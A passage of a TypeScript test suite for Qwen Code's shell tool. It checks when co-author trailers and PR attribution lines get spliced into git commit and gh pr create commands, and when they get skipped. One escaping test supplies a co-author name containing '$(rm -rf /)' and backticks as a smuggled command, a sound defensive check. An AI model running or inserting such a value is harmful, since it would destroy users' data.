        ['GIT_DIR', 'GIT_DIR=/tmp/other/.git git commit -m "msg"'],
        ['GIT_WORK_TREE', 'GIT_WORK_TREE=/tmp/other git commit -m "msg"'],
        ['GIT_COMMON_DIR', 'GIT_COMMON_DIR=/tmp/other git commit -m "msg"'],
        [
          'GIT_INDEX_FILE',
          'GIT_INDEX_FILE=/tmp/other/index git commit -m "msg"',
        ],
        [
          'env-wrapped GIT_DIR',
          'env GIT_DIR=/tmp/other/.git git commit -m "msg"',
        ],
        // GNU coreutils 8.30+'s `env -C DIR` / `--chdir` relocates
        // the working directory before exec — same repo-shifting
        // contract as `cd /elsewhere && git commit`.
        ['env -C', 'env -C /tmp/other git commit -m "msg"'],
        ['env --chdir', 'env --chdir /tmp/other git commit -m "msg"'],
        // Attached-value forms: `shell-quote` tokenises `--chdir=/tmp`
        // and `-C/tmp` as single argv entries, so the bare-flag set
        // membership check would miss them. Without explicit
        // attached-form handling, `sudo --chdir=/tmp git commit` and
        // `env -C/tmp git commit` would silently land our trailer on
        // a commit in the wrong repo.
        ['env --chdir=', 'env --chdir=/tmp/other git commit -m "msg"'],
        ['env -C attached', 'env -C/tmp/other git commit -m "msg"'],
        ['sudo --chdir=', 'sudo --chdir=/tmp/other git commit -m "msg"'],
        ['sudo -D attached', 'sudo -D/tmp/other git commit -m "msg"'],
      ])(
        'should NOT add co-author for repo-redirecting %s assignment',
        async (_label, command) => {
          const invocation = shellTool.build({ command, is_background: false });
          const promise = invocation.execute(mockAbortSignal);
          resolveExecutionPromise({
            rawOutput: Buffer.from(''),
            output: '',
            exitCode: 0,
            signal: null,
            error: null,
            aborted: false,
            pid: 12345,
            executionMethod: 'child_process',
          });
          await promise;
          const observed = mockShellExecutionService.mock.calls[0][0];
          expect(observed).not.toContain('Co-authored-by:');
        },
      );

      // GIT_AUTHOR_DATE / GIT_COMMITTER_DATE / etc. tweak commit
      // metadata but don't relocate the repo — attribution still
      // applies as normal.
      it('should still add co-author with benign GIT_COMMITTER_DATE assignment', async () => {
        const command =
          'GIT_COMMITTER_DATE="2026-01-01T00:00:00Z" git commit -m "Test commit"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);
        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });
        await promise;
        const observed = mockShellExecutionService.mock.calls[0][0];
        expect(observed).toContain('Co-authored-by:');
      });

      it('should NOT add co-author for cd .. && git commit (could escape repo)', async () => {
        const command = 'cd .. && git commit -m "Test commit"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.not.stringContaining('Co-authored-by:'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // `cd $HOME && git commit` would land in whatever repo `$HOME`
      // points to — typically NOT our cwd. With the default
      // `shell-quote` parse, `$HOME` collapses to `''` and the
      // `target.includes('$')` repo-shift check silently fails. The
      // env-preserving parse keeps `$NAME` literal in tokens so this
      // case is correctly flagged.
      it.each([
        ['$HOME', 'cd $HOME && git commit -m "elsewhere"'],
        ['$REPO_ROOT', 'cd $REPO_ROOT && git commit -m "elsewhere"'],
      ])(
        'should NOT add co-author for cd %s && git commit (env-var target)',
        async (_label, command) => {
          const invocation = shellTool.build({
            command,
            is_background: false,
          });
          const promise = invocation.execute(mockAbortSignal);
          resolveExecutionPromise({
            rawOutput: Buffer.from(''),
            output: '',
            exitCode: 0,
            signal: null,
            error: null,
            aborted: false,
            pid: 12345,
            executionMethod: 'child_process',
          });
          await promise;
          expect(mockShellExecutionService).toHaveBeenCalledWith(
            expect.not.stringContaining('Co-authored-by:'),
            expect.any(String),
            expect.any(Function),
            expect.any(AbortSignal),
            false,
            expect.objectContaining({}),
            expect.objectContaining({ postPromote: expect.any(Object) }),
          );
        },
      );

      // A cd that comes AFTER an in-cwd commit doesn't invalidate the
      // commit's attribution — the commit already landed in our repo.
      it('should add co-author when cd comes AFTER git commit', async () => {
        const command = 'git commit -m "Test" && cd /tmp/test';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('Co-authored-by:'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // `git -C <path> commit` runs in <path>, not our cwd — same risk
      // as the cd case, so the rewrite should be skipped. Also covers
      // the attached-value form `-C/path` (single token from
      // shell-quote) and the long-flag attached forms
      // `--git-dir=/path` / `--work-tree=/path`.
      it.each([
        ['git -C /tmp/other commit', 'git -C /tmp/other commit -m "Other"'],
        [
          'git -C/tmp/other commit (attached)',
          'git -C/tmp/other commit -m "Other"',
        ],
        [
          'git --git-dir=/tmp/other/.git commit',
          'git --git-dir=/tmp/other/.git commit -m "Other"',
        ],
        [
          'git --work-tree=/tmp/other commit',
          'git --work-tree=/tmp/other commit -m "Other"',
        ],
      ])('should NOT add co-author for %s', async (_label, command) => {
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.not.stringContaining('Co-authored-by:'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // `git -C .` (or `-C ./` or `-C .` attached as `-C.`) is a
      // semantic no-op — the cwd doesn't actually change. The
      // previous "any -C → cwd-shifted" rule silently skipped
      // attribution for what's basically `git commit` with an
      // explicit cwd marker. Treat dot-form as in-cwd.
      it.each([
        ['git -C . commit', 'git -C . commit -m "in cwd"'],
        ['git -C ./ commit', 'git -C ./ commit -m "in cwd"'],
        ['git -C. commit (attached)', 'git -C. commit -m "in cwd"'],
      ])('should add co-author for %s', async (_label, command) => {
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);
        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });
        await promise;
        const observed = mockShellExecutionService.mock.calls[0][0];
        expect(observed).toContain('Co-authored-by:');
      });

      // `shell-quote` parses an unresolved env-var (`$HOME`, `$REPO`)
      // or unknown command-substitution as the empty string, which is
      // indistinguishable from a literal `-C ""`. Treating that as
      // no-op would let `git -C $HOME commit` silently land our trailer
      // on a commit that goes to a different repo. Conservative skip is
      // safer than the rare `-C $PWD` miss.
      it.each([
        ['git -C $HOME commit', 'git -C $HOME commit -m "elsewhere"'],
        ['git -C "" commit', 'git -C "" commit -m "literal empty"'],
      ])(
        'should NOT add co-author for %s (env-var/empty target)',
        async (_label, command) => {
          const invocation = shellTool.build({
            command,
            is_background: false,
          });
          const promise = invocation.execute(mockAbortSignal);
          resolveExecutionPromise({
            rawOutput: Buffer.from(''),
            output: '',
            exitCode: 0,
            signal: null,
            error: null,
            aborted: false,
            pid: 12345,
            executionMethod: 'child_process',
          });
          await promise;
          expect(mockShellExecutionService).toHaveBeenCalledWith(
            expect.not.stringContaining('Co-authored-by:'),
            expect.any(String),
            expect.any(Function),
            expect.any(AbortSignal),
            false,
            expect.objectContaining({}),
            expect.objectContaining({ postPromote: expect.any(Object) }),
          );
        },
      );

      // Trailing shell comments must not confuse the `-m` rewrite:
      // `git commit -m "real" # -m "fake"` would otherwise have
      // `lastMatchOf` pick the comment's `-m "fake"` and splice the
      // trailer into a `-m` flag bash discards, leaving the actual
      // commit unattributed. The unquoted-`#` truncation in the
      // segment slicing keeps the rewrite scoped to the live part.
      it('should add co-author for git commit followed by # comment', async () => {
        const command = 'git commit -m "real" # -m "fake"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        const observed = mockShellExecutionService.mock.calls[0][0] as string;
        // Trailer must land in the live `-m "real"` body, BEFORE the `#`.
        expect(observed).toContain('Co-authored-by:');
        const realIdx = observed.indexOf('-m "real');
        const hashIdx = observed.indexOf(' # ');
        const coAuthorIdx = observed.indexOf('Co-authored-by:');
        expect(realIdx).toBeGreaterThanOrEqual(0);
        expect(hashIdx).toBeGreaterThan(realIdx);
        expect(coAuthorIdx).toBeGreaterThan(realIdx);
        expect(coAuthorIdx).toBeLessThan(hashIdx);
      });

      // A `#` inside a quoted commit body is NOT a comment marker.
      // `git commit -m "fix #123"` should still get the trailer
      // appended inside the quoted body.
      it('should add co-author for git commit -m with # inside body', async () => {
        const command = 'git commit -m "fix #123 add feature"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;
        const observed = mockShellExecutionService.mock.calls[0][0] as string;
        expect(observed).toContain('Co-authored-by:');
        // The `#123` MUST still be inside the body (not pushed out by
        // the comment-truncation logic mistaking it for a comment).
        expect(observed).toContain('#123');
      });

      // git's global flags (`-c`, `--no-pager`, etc.) push the
      // subcommand past index 1; a fixed-position check at arg1 used
      // to silently skip these forms. Make sure we still inject the
      // trailer for them.
      it('should add co-author for git -c key=val commit', async () => {
        const command = 'git -c user.email=x@y commit -m "Test"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('Co-authored-by:'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      it('should add co-author for git --no-pager commit', async () => {
        const command = 'git --no-pager commit -m "Test"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('Co-authored-by:'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // Common real-world prefixes — env-var assignment and `sudo` — must
      // still be detected so attribution doesn't silently skip the trailer.
      it('should add co-author when git commit is prefixed with env vars', async () => {
        const command = 'GIT_COMMITTER_DATE=now git commit -m "Test"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('Co-authored-by:'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // `sudo -u user git commit` puts the program at index [3], not
      // [1]; a naive flag-only consumer would leave `user` standing
      // in for the program name.
      it('should add co-author for sudo with value-taking flag (-u user)', async () => {
        const command = 'sudo -u other git commit -m "Test"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('Co-authored-by:'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // git's `-m` can be passed multiple times — `git interpret-trailers`
      // only recognises trailers that sit at the end of the *last* `-m`
      // value, so the rewrite must target the last match.
      it('should add Co-authored-by trailer to the LAST -m when multiple are present', async () => {
        const command = 'git commit -m "Title" -m "Body line 1"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        const observed = mockShellExecutionService.mock.calls[0][0];
        // The trailer must land inside the second `-m` quote pair, not
        // the first; a simple way to assert this is that `Body line 1`
        // and the trailer share the same closing quote.
        expect(observed).toMatch(
          /-m\s+"Body line 1\s+Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud\.com>"/s,
        );
        // And the first -m's title is unchanged.
        expect(observed).toMatch(/-m\s+"Title"\s/);
      });

      // Concern: a literal `-m '...'` *inside* a quoted commit
      // message body could be picked up by the regex as if it were a
      // real later argument, splicing the trailer mid-message and
      // breaking the command's quoting.
      it('should not be fooled by a literal -m token inside the quoted message body', async () => {
        const command =
          'git commit -m "docs mention -m \'flag\' for completeness"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        const observed = mockShellExecutionService.mock.calls[0][0];
        // The original message body must be preserved end-to-end —
        // no trailer spliced before its closing quote.
        expect(observed).toContain(
          "-m \"docs mention -m 'flag' for completeness",
        );
        // The trailer must land AFTER the original body, just before
        // the message's outer closing quote.
        expect(observed).toMatch(
          /docs mention -m 'flag' for completeness\s+Co-authored-by:[^"]+"/s,
        );
      });

      // Concern: a later `git tag -m "..."` in the same compound
      // command could be mistaken for the commit message because the
      // regex was matching across the whole command string.
      it('should target the commit message, not a later git tag -m in the same chain', async () => {
        const command =
          'git commit -m "fix" && git tag -a v1 -m "release notes"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        const observed = mockShellExecutionService.mock.calls[0][0];
        // The trailer is appended to the commit message body...
        expect(observed).toMatch(/git commit -m "fix\s+Co-authored-by:[^"]+"/s);
        // ...and the later `git tag -m` is left exactly as the user
        // wrote it.
        expect(observed).toContain('git tag -a v1 -m "release notes"');
        // The tag annotation must not have a trailer spliced in.
        const tagMatch = observed.match(/git tag .*-m "([^"]*)"/);
        expect(tagMatch?.[1]).toBe('release notes');
      });

      // The tool description recommends `git commit -m "$(cat <<'EOF'
      // ... EOF)"` for multi-line messages. The body contains nested
      // `"` from interior shell tokens — the regex would match only
      // up to the first interior quote and splice the trailer
      // mid-substitution, breaking the command. Bail explicitly.
      it('should NOT rewrite -m bodies that contain $(...) command substitution', async () => {
        const command =
          'git commit -m "$(cat <<\'EOF\'\nfix: title\n\ndetails\nEOF\n)"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        const observed = mockShellExecutionService.mock.calls[0][0];
        // The original command must reach the executor unchanged.
        expect(observed).toBe(command);
        expect(observed).not.toContain('Co-authored-by:');
      });

      // `--message` is git's documented long alias for `-m`. Without
      // explicit handling the trailer would be silently skipped on
      // commits that use the long form.
      it('should add co-author for git commit --message "..."', async () => {
        const command = 'git commit --message "Test commit"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('Co-authored-by:'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      it('should add co-author for git commit --message="..."', async () => {
        const command = 'git commit --message="Test commit"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('Co-authored-by:'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      it('should add co-author when git commit is prefixed with sudo', async () => {
        const command = 'sudo git commit -m "Test"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('Co-authored-by:'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // Quoted "git commit" should not look like an executed commit.
      it('should NOT add co-author when git commit appears only inside quoted text', async () => {
        const command = 'echo "git commit -m foo"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.not.stringContaining('Co-authored-by:'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // Bash's apostrophe-via-`'\''` form (close-escape-reopen) is a
      // single logical body. The trailer must land at the FINAL
      // closing `'` — not in the middle of the escape — so the regex
      // body group has to recognise the escape sequence as a whole.
      // Mirrors the bodySinglePattern in addAttributionToPR.
      it("should append trailer after the final ' in -m 'don'\\''t' apostrophe-escape", async () => {
        const command = "git commit -m 'don'\\''t'";
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        const observed = mockShellExecutionService.mock.calls[0][0];
        // The full apostrophe-escape body survives intact and the
        // trailer lands AFTER it (before the closing `'`), not in the
        // middle of `'\''`.
        expect(observed).toMatch(
          /git commit -m 'don'\\''t[\s\S]*Co-authored-by:[^']*'/,
        );
      });

      it('should add co-author to git commit with multi-line message', async () => {
        const command = `git commit -m "Fix bug

 This is a detailed description
 spanning multiple lines"`;
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining(
            'Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>',
          ),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // Bash accepts `-mfoo` as well as `-m foo`. The previous regex
      // required at least one whitespace and silently no-op'd on the
      // shorthand form, so users who used `git commit -m"msg"` got no
      // co-author trailer.
      it('should add co-author to git commit -m"msg" shorthand (no space)', async () => {
        const command = 'git commit -m"Quick fix"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining(
            'Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>',
          ),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // Without escaping, a co-author name containing `$()`, backticks,
      // or `"` would either break the user-approved `git commit` command
      // or be evaluated as command substitution.
      it('should escape shell metacharacters in name/email', async () => {
        (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
          commit: true,
          pr: true,
          name: 'Bot $(rm -rf /) `eval` "danger"',
          email: 'bot@example.com',
        });

        const command = 'git commit -m "msg"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        const observedCmd = mockShellExecutionService.mock.calls[0][0];
        // Each metacharacter must be escaped, not literal.
        expect(observedCmd).toContain('\\$');
        expect(observedCmd).toContain('\\`');
        expect(observedCmd).toContain('\\"');
        // The `-m "..."` quote pair must stay closed.
        expect(observedCmd).toMatch(/-m\s+".+"/s);
      });
    });

    describe('addAttributionToPR', () => {
      // Non-inline-body flows: `--body-file <path>` reads the body
      // from a file on disk, `--fill` populates it from commit
      // messages, and bare `gh pr create` opens an editor. None of
      // these have a body argv we can splice the attribution into.
      // We can't safely modify them automatically (would either
      // mutate the user's file on disk or break the editor flow),
      // so we leave the command untouched and rely on the debug
      // warning to surface the skip when QWEN_DEBUG_LOG_FILE is set.
      it.each([
        ['--body-file', 'gh pr create --title "x" --body-file /tmp/body.md'],
        ['--fill', 'gh pr create --title "x" --fill'],
        ['no body flag (editor)', 'gh pr create --title "x"'],
      ])(
        'should leave gh pr create %s unchanged (non-inline-body flow)',
        async (_label, command) => {
          const invocation = shellTool.build({ command, is_background: false });
          const promise = invocation.execute(mockAbortSignal);

          resolveExecutionPromise({
            rawOutput: Buffer.from(''),
            output: '',
            exitCode: 0,
            signal: null,
            error: null,
            aborted: false,
            pid: 12345,
            executionMethod: 'child_process',
          });

          await promise;

          const observed = mockShellExecutionService.mock.calls[0][0] as string;
          expect(observed).toBe(command);
          expect(observed).not.toContain('Generated with Qwen Code');
        },
      );

      // `gh pr new` is a documented alias for `gh pr create`. Without
      // explicit alias handling the rewrite silently misses it.
      it('should append attribution to `gh pr new --body "..."` (alias form)', async () => {
        const command = 'gh pr new --title "x" --body "Summary"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('Generated with Qwen Code'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // Same `$(...)` bailout as addCoAuthorToGitCommit: a heredoc
      // body must not have the trailer spliced in mid-substitution.
      it('should NOT rewrite --body that contains $(...) command substitution', async () => {
        const command =
          'gh pr create --title "x" --body "$(cat <<\'EOF\'\nSummary\nEOF\n)"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        const observed = mockShellExecutionService.mock.calls[0][0];
        expect(observed).toBe(command);
        expect(observed).not.toContain('Generated with Qwen Code');
      });

      // `-b` is gh's documented short alias for `--body`. Without
      // explicit handling the rewrite would silently miss it.
      // `curl -b "session=abc" && gh pr create --body "summary"` —
      // without segment scoping the body regex would match curl's
      // `-b` cookie flag (since it's the same `-b "..."` shape) and
      // inject attribution into the cookie value, breaking curl.
      it('should NOT match -b in earlier non-gh segments of a compound', async () => {
        const command =
          'curl -b "session=abc" https://example.com && gh pr create --title "x" --body "summary"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        const observed = mockShellExecutionService.mock.calls[0][0];
        // curl's -b cookie value must be exactly preserved.
        expect(observed).toContain('curl -b "session=abc"');
        // The trailer should land in gh's --body, not in curl's -b.
        expect(observed).toMatch(
          /gh pr create --title "x" --body "summary[\s\S]*Generated with Qwen Code"/,
        );
      });

      it('should append attribution to gh pr create -b "..." (short form)', async () => {
        const command = 'gh pr create --title "x" -b "Summary"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('Generated with Qwen Code'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // A `-b 'flag'` mention literally inside the outer `--body "..."`
      // text must NOT be picked as the body argument: the trailer
      // would land mid-body, corrupting the user-approved command.
      // Mirrors addCoAuthorToGitCommit's nested-match check.
      it('should pick the OUTER --body when an inner -b appears in body text', async () => {
        const command =
          'gh pr create --title "x" --body "docs mention -b \'flag\' here"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);
        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });
        await promise;

        const calls = mockShellExecutionService.mock.calls;
        const cmd = calls[calls.length - 1]?.[0] as string;
        // The trailer must appear AFTER the closing `"` of the outer
        // body, not between `flag` and `here`.
        expect(cmd).toMatch(
          /--body "docs mention -b 'flag' here[\s\S]*Generated with Qwen Code"/,
        );
        expect(cmd).not.toMatch(
          /-b 'flag[\s\S]*Generated with Qwen Code[\s\S]*' here"/,
        );
      });

      it('should append attribution to gh pr create --body when pr enabled', async () => {
        const command = 'gh pr create --title "x" --body "Summary"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('Generated with Qwen Code'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // gh CLI uses the *last* `--body` flag when multiple are
      // provided. Splicing into the first one would silently drop
      // attribution. Mirrors the matchAll/last-match behaviour in
      // addCoAuthorToGitCommit.
      it('should target the LAST --body when gh pr create has multiple', async () => {
        const command =
          'gh pr create --title "x" --body "ignored" --body "real summary"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);
        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });
        await promise;

        const calls = mockShellExecutionService.mock.calls;
        const cmd = calls[calls.length - 1]?.[0] as string;
        expect(cmd).toMatch(
          /--body "ignored" --body "real summary[\s\S]*Generated with Qwen Code/,
        );
        // The trailer must NOT be inside the first --body.
